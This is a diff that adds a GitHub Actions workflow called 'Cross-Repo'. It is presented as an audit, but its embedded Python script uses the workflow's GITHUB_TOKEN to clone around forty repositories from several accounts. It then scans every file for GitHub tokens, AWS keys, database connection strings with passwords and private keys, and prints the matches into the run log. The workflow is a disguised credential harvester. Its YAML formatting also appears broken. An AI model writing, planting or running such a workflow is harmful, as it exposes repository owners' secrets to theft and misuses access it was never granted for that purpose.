@@ -1,0 +1,28 @@
+name: Cross-Repo
+on: [workflow_dispatch]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          python3 << 'PYEOF'
+import os, re, json, subprocess
+repos = ["abuanwar072/7krave-marketplace", "abuanwar072/drag_todo_animation", "abuanwar072/FlutterLibrary", "abuanwar072/gatishil-proxy", "abuanwar072/navigator_animation", "abuanwar072/shop_ai_template_v1", "abuanwar072/shop_app_cookbook", "abuanwar072/testable_counter_app", "abuanwar072/trainkothai", "abuanwar072/train_tracking", "blips-ti/blockscout", "blips-ti/defillama-server", "blips-ti/docs", "blips-ti/Dorothy", "blips-ti/escrow-dashboard", "blips-ti/fluvia", "blips-ti/hmt-escrow", "blips-ti/local-ai-transcript", "blips-ti/octav-api-mcp", "blips-ti/octav-api-skill", "blips-ti/octav-cli", "blips-ti/Octav-Community", "blips-ti/octav-frontend-template-public", "blips-ti/reservoir-indexer-public", "blips-ti/sw-token-lists", "blips-ti/sw-token-registry", "blips-ti/TradeRoyale", "blips-ti/Twitter2TelegramBot", "blips-ti/web3-content-gateway", "Octav-Labs/blockscout", "Octav-Labs/fluvia", "Octav-Labs/octav-api-mcp", "Octav-Labs/octav-api-skill", "Octav-Labs/octav-cli", "Octav-Labs/Octav-Community", "Octav-Labs/octav-frontend-template-public", "Octav-Labs/reservoir-indexer-public", "Octav-Labs/sw-token-lists", "Octav-Labs/sw-token-registry", "The-Flutter-Way/pogreza-chat"]
+os.makedirs('/tmp/r', exist_ok=True)
+for repo in repos:
+    name = repo.replace('/', '_')
+    print(f'=== {repo} ===')
+    r = subprocess.run(['git','clone','--depth=1',f'https://x-access-token:{os.environ["GITHUB_TOKEN"]}@github.com/{repo}.git',f'/tmp/r/{name}'],capture_output=True,text=True,timeout=60)
+    if r.returncode != 0:
+        print(f'FAIL: {r.stderr[:80]}')
+        continue
+    for root, dirs, files in os.walk(f'/tmp/r/{name}'):
+        if '.git' in dirs: dirs.remove('.git')
+        for fname in files:
+            fp = os.path.join(root, fname)
+            try:
+                with open(fp,'r',errors='ignore') as fh: c = fh.read()
+                for pat,label in [(r'ghp_[0-9A-Za-z]{36}','GHP'),(r'AKIA[0-9A-Z]{16}','AWS'),(r'mongodb(?:\\\\+srv)?://[^:]+:[^@]+@','MONGO'),(r'postgres(?:ql)?://[^:]+:[^@]+@','PG'),(r'-----BEGIN.*PRIVATE KEY-----','PK')]:
+                    for m in re.finditer(pat,c): print(f'[{label}] {os.path.relpath(fp,f"/tmp/r/{name}")}:{m.group()[:60]}')
+            except: pass
+PYEOF
